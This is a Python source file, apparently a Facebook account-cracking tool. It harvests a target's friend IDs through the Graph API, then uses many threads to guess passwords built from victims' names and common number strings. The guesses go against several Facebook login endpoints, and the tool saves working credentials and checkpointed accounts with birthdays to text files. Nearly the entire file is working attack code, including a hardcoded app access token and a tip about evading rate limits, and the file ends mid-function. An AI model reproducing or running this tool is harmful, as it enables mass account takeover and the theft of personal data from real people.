__ff_dev__ = 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth&_rdr'

def Mking_pro():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        tanya_total = int(raw_input('\n%s [%s\xe2\x80\xa2%s] Haw many id Number crack ? : ' % (p, k, p)))
    except:
        tanya_total = 1

    for t in range(tanya_total):
        t += 1
        idt = raw_input('\n%s [%s\xe2\x80\xa2%s] Enter id  \n [%s\xe2\x80\xa2%s] ID target%s: ' % (p, k, p, k, p, t))
        try:
            for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, token)).json()['data']:
                idne = i['id']
                jenenge = i['name']
                id.append(idne + '<=>' + jenenge)

        except KeyError:
            exit('\n%s [%s!%s] Private id' % (p, m, p))

    if len(id) == 0:
        exit('\n%s [%s!%s] total ID 0  ' % (p, m, p))
    else:
        print '%s [%s\xe2\x80\xa2%s] Total id :%s %s' % (p, k, p, h, len(id))


def method_crack_mking():
    print '\n     \x1b[41m\x1b[1;37m[ Choose methode crack ]\x1b[0m'
    print '\n%s [%s1%s] Crack with Api Facebook + %s Birthday ' % (p, k, p, k)
    print '\n%s [%s2%s] Crack with Mbasic %s(mking_pro fast) + %sBirthday' % (p, k, p, b, k)
    print '\n%s [%s3%s] Crack with Touch Facebook + %sBirthday' % (p, k, p, k)
    print '\n%s [%s4%s] Crack with X.Facebook + %sBirthday' % (p, k, p, k)
    print '\n%s [%s5%s] Crack with D.facebook + %sBirthday' % (p, k, p, k)
    print '\n%s [%s6%s] Crack with Free.Facebook + %sBirthday\n' % (p, k, p, k)
    profers = raw_input(' \x1b[4;33mChoose Option %s:\x1b[0m %s\xe2\x9e\xa4%s\xe2\x9e\xa4%s\xe2\x9e\xa4%s\xe2\x9e\xa4 %s' % (p, m, k, h, b, p))
    if profers in ('', ):
        method_crack_mking()
    elif profers in ('1', '01'):
        bukanmaen = raw_input('\n%s [%s\xe2\x80\xa2%s] Crack With Pass auto/choice [ y/t]\n %s ' % (p, k, p, profaisor_style))
        if bukanmaen in ('t', 'T'):
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                asu = raw_input('%s [%s\xe2\x80\xa2%s] Example password: 100200,afghanistan,500600,1122334455\n %s[%s\xe2\x80\xa2%s] Pass list: ' % (p, k, p, p, k, p)).split(',')
                if len(asu) == '':
                    exit('%s [%s!%s] no pass ' % (p, m, p))
                print '\n%s [%s\xe2\x80\xa2%s] OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s]  CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No Crack ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(api, uid, asu)

            hasil()
        elif bukanmaen in ('y', 'Y'):
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n%s [%s\xe2\x80\xa2%s]OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s]  CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No crack id ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    frist = name.split(' ')
                    if len(frist) >= 6:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 2:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 3:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    else:
                        pwcuk = [
                         '100200', '500600', '786786', '1122334455', '223344', 'afghanistan', 'afg123', '1234512345', '112233445566', '1234554321', '1020304050', '123456']
                    coeg.submit(api, uid, pwcuk)

            hasil()
    elif profers == '2':
        bukanmaen = raw_input('\n%s [%s\xe2\x80\xa2%s] Crack With Pass auto/choice [y/t]\n %s ' % (p, k, p, profaisor_style))
        if bukanmaen in ('t', 'T'):
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                asu = raw_input('%s [%s\xe2\x80\xa2%s] Example password: 100200,afghanistan,500600,1122334455\n %s[%s\xe2\x80\xa2%s] Pass list: ' % (p, k, p, p, k, p)).split(',')
                if len(asu) == '':
                    exit('%s [%s!%s] Error no pass' % (p, m, p))
                print '\n%s [%s\xe2\x80\xa2%s] OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s] CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No Crack ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(mbasic, uid, asu)

            hasil()
        elif bukanmaen == 'y':
            with ThreadPoolExecutor(max_workers=35) as (coeg):
                print '\n%s [%s\xe2\x80\xa2%s]  OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s]  CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No Crack ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    frist = name.split(' ')
                    if len(frist) >= 6:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 2:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 3:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    else:
                        pwcuk = [
                         '100200', '500600', '786786', '1122334455', '223344', 'afghanistan', 'afg123', '1234512345', '112233445566', '1234554321', '1020304050', '123456']
                    coeg.submit(mbasic, uid, pwcuk)

            hasil()
    elif profers == '3':
        bukanmaen = raw_input('\n%s [%s\xe2\x80\xa2%s] Crack With Pass auto/choice [y/t]\n %s[%s\xe2\x80\xa2%s] Choose: ' % (p, k, p, p, k, p))
        if bukanmaen in ('t', 'T'):
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                asu = raw_input('%s [%s\xe2\x80\xa2%s] Example password: 100200,afghanistan,500600,1122334455\n %s[%s\xe2\x80\xa2%s] Pass list: ' % (p, k, p, p, k, p)).split(',')
                if len(asu) == '':
                    exit('%s [%s!%s] Error no pass' % (p, m, p))
                print '\n%s [%s\xe2\x80\xa2%s]  OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s]  CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No Crack ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(mobile, uid, asu)

            hasil()
        elif bukanmaen == 'y':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n%s [%s\xe2\x80\xa2%s]  OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s]  CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No Crack ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    frist = name.split(' ')
                    if len(frist) >= 6:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 2:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 3:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    else:
                        pwcuk = [
                         '100200', '500600', '786786', '1122334455', '223344', 'afghanistan', 'afg123', '1234512345', '112233445566', '1234554321', '1020304050', '123456']
                    coeg.submit(mobile, uid, pwcuk)

            hasil()
    elif profers == '4':
        bukanmaen = raw_input('\n%s [%s\xe2\x80\xa2%s] Crack With Pass auto/choice [y/t]\n %s[%s\xe2\x80\xa2%s] Choose: ' % (p, k, p, p, k, p))
        if bukanmaen in ('t', 'T'):
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                asu = raw_input('%s [%s\xe2\x80\xa2%s] Example password: 100200,afghanistan,500600,1122334455\n %s[%s\xe2\x80\xa2%s] Pass list: ' % (p, k, p, p, k, p)).split(',')
                if len(asu) == '':
                    exit('%s [%s!%s] Error no pass' % (p, m, p))
                print '\n%s [%s\xe2\x80\xa2%s]  OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s]  CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No Crack ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(xfb, uid, asu)

            hasil()
        elif bukanmaen == 'y':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n%s [%s\xe2\x80\xa2%s]  OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s]  CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No Crack ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    frist = name.split(' ')
                    if len(frist) >= 6:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 2:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 3:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    else:
                        pwcuk = [
                         '100200', '500600', '786786', '1122334455', '223344', 'afghanistan', 'afg123', '1234512345', '112233445566', '1234554321', '1020304050', '123456']
                    coeg.submit(xfb, uid, pwcuk)

            hasil()
    elif profers == '5':
        bukanmaen = raw_input('\n%s [%s\xe2\x80\xa2%s] Crack With Pass auto/choice [y/t]\n %s[%s\xe2\x80\xa2%s] Choose: ' % (p, k, p, p, k, p))
        if bukanmaen in ('t', 'T'):
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                asu = raw_input('%s [%s\xe2\x80\xa2%s] Example password: 100200,afghanistan,500600,1122334455\n %s[%s\xe2\x80\xa2%s] Pass list: ' % (p, k, p, p, k, p)).split(',')
                if len(asu) == '':
                    exit('%s [%s!%s] Error no pass' % (p, m, p))
                print '\n%s [%s\xe2\x80\xa2%s]  OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s]  CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No Crack ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(dfb, uid, asu)

            hasil()
        elif bukanmaen == 'y':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n%s [%s\xe2\x80\xa2%s]  OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s]  CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No Crack ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    frist = name.split(' ')
                    if len(frist) >= 6:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 2:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 3:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    else:
                        pwcuk = [
                         '100200', '500600', '786786', '1122334455', '223344', 'afghanistan', 'afg123', '1234512345', '112233445566', '1234554321', '1020304050', '123456']
                    coeg.submit(dfb, uid, pwcuk)

            hasil()
    elif profers == '6':
        bukanmaen = raw_input('\n%s [%s\xe2\x80\xa2%s] Crack With Pass auto/choice [y/t]\n %s[%s\xe2\x80\xa2%s] Choose: ' % (p, k, p, p, k, p))
        if bukanmaen in ('t', 'T'):
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                asu = raw_input('%s [%s\xe2\x80\xa2%s] Example password: 100200,afghanistan,500600,1122334455\n %s[%s\xe2\x80\xa2%s] Pass list: ' % (p, k, p, p, k, p)).split(',')
                if len(asu) == '':
                    exit('%s [%s!%s] Error no pass' % (p, m, p))
                print '\n%s [%s\xe2\x80\xa2%s]  OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s]  CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No Crack ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(freefb, uid, asu)

            hasil()
        elif bukanmaen == 'y':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n%s [%s\xe2\x80\xa2%s]  OK Crack saved to : ok.txt\n %s[%s\xe2\x80\xa2%s]  CP Crack saved to : cp.txt' % (p, k, p, p, k, p)
                print '%s [%s\xe2\x80\xa2%s] No Crack ? turn on mode airplane (5 sec)' % (p, k, p)
                for user in id:
                    uid, name = user.split('<=>')
                    frist = name.split(' ')
                    if len(frist) >= 6:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 2:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    elif len(frist) <= 3:
                        pwcuk = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', '100200', '500600', '786786', '1122334455', '1234512345']
                    else:
                        pwcuk = [
                         '100200', '500600', '786786', '1122334455', '223344', 'afghanistan', 'afg123', '1234512345', '112233445566', '1234554321', '1020304050', '123456']
                    coeg.submit(freefb, uid, pwcuk)

            hasil()
        else:
            exit('\n%s [%s!%s] Unknown!' % (p, m, p))
    else:
        menu()


def api(uid, pwcuk):
    global cp
    global loop
    global ok
    global token
    try:
        ua = open('ua', 'r').read()
    except IOError:
        ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'

    sys.stdout.write('\r [MKING_Crack] %s/%s Mking-Ok:-%s - MKING-CP :-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwcuk:
        pw = pw.lower()
        ses = requests.Session()
        headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
        send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
        if 'session_key' in send.text and 'EAAA' in send.text:
            print '\r \x1b[1;32m[Mking-Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s | %s' % (uid, pw))
            open('ok.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        elif 'www.facebook.com' in send.json()['error_msg']:
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r\x1b[1;33m [MKING-CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                    cp.append('%s | %s' % (uid, pw))
                    open('cp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    open('checkcp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass

            print '\r\x1b[1;33m [MKING-CP ] %s \xe2\x80\xa2 %s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s | %s' % (uid, pw))
            open('cp.txt', 'a').write('%s | %s\n' % (uid, pw))
            open('checkcp.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        else:
            continue

    loop += 1


def mbasic(uid, pwcuk):
    global loop
    global token
    try:
        ua = open('ua', 'r').read()
    except IOError:
        ua = '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        ua = random.choice(['[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
         '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
         '[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649505;FBDM/{density=2.625,width=1080,height=2034};FBLC/sv_SE;FBRV/0;FBCR/Telia;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
         'Mozilla/5.0 (Linux; Android 10; motorola one macro Build/QMDS30.47-33-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]'])

    rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
    sys.stdout.write('\r %s[Crack] %s/%s Mking-Ok:-%s - MKING-CP:-%s ' % (rm, loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwcuk:
        kwargs = {}
        pw = pw.lower()
        ses = requests.Session()
        ses.headers.update({'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
        p = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&refid=8').text
        b = parser(p, 'html.parser')
        bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
        for i in b('input'):
            try:
                if i.get('name') in bl:
                    kwargs.update({i.get('name'): i.get('value')})
                else:
                    continue
            except:
                pass

        kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
        qobil = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', data=kwargs)
        if 'c_user' in ses.cookies.get_dict().keys():
            kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace('noscript=1;', '')
            print '\r \x1b[1;32m[Mking-Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s | %s' % (uid, pw))
            open('ok.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        elif 'checkpoint' in ses.cookies.get_dict().keys():
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r\x1b[1;33m [MKING-CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                    cp.append('%s | %s' % (uid, pw))
                    open('cp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    open('checkcp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass

            print '\r\x1b[1;33m [MKING-CP] %s \xe2\x80\xa2 %s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s | %s' % (uid, pw))
            open('cp.txt', 'a').write('%s | %s\n' % (uid, pw))
            open('checkcp.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        else:
            continue

    loop += 1


def mobile(uid, pwcuk):
    global loop
    global token
    try:
        ua = open('ua', 'r').read()
    except IOError:
        ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'

    sys.stdout.write('\r [Crack] %s/%s Mking-Ok:-%s - MKING-CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwcuk:
        kwargs = {}
        pw = pw.lower()
        ses = requests.Session()
        ses.headers.update({'origin': 'https://touch.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'touch.facebook.com', 'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
        p = ses.get('https://touch.facebook.com/login/?next&ref=dbl&refid=8').text
        b = parser(p, 'html.parser')
        bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
        for i in b('input'):
            try:
                if i.get('name') in bl:
                    kwargs.update({i.get('name'): i.get('value')})
                else:
                    continue
            except:
                pass

        kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
        qobil = ses.post('https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8', data=kwargs)
        if 'c_user' in ses.cookies.get_dict().keys():
            kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace('noscript=1;', '')
            print '\r \x1b[1;32m[Mking-Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s | %s' % (uid, pw))
            open('ok.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        elif 'checkpoint' in ses.cookies.get_dict().keys():
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r\x1b[1;33m [MKING-CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                    cp.append('%s | %s' % (uid, pw))
                    open('cp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    open('checkcp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass

            print '\r\x1b[1;33m [MKING-CP] %s \xe2\x80\xa2 %s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s | %s' % (uid, pw))
            open('cp.txt', 'a').write('%s | %s\n' % (uid, pw))
            open('checkcp.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        else:
            continue

    loop += 1


def xfb(uid, pwcuk):
    global loop
    global token
    try:
        ua = open('ua', 'r').read()
    except IOError:
        ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'

    sys.stdout.write('\r [Crack] %s/%s Mking-Ok:-%s - MKING-CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwcuk:
        kwargs = {}
        pw = pw.lower()
        ses = requests.Session()
        ses.headers.update({'origin': 'https://x.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'x.facebook.com', 'referer': 'https://x.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
        p = ses.get('https://x.facebook.com/login/?next&ref=dbl&refid=8').text
        b = parser(p, 'html.parser')
        bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
        for i in b('input'):
            try:
                if i.get('name') in bl:
                    kwargs.update({i.get('name'): i.get('value')})
                else:
                    continue
            except:
                pass

        kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
        qobil = ses.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fd.facebook.com%2F&lwv=100&refid=8', data=kwargs)
        if 'c_user' in ses.cookies.get_dict().keys():
            kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace('noscript=1;', '')
            print '\r \x1b[1;32m[Mking-Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s | %s' % (uid, pw))
            open('ok.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        elif 'checkpoint' in ses.cookies.get_dict().keys():
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
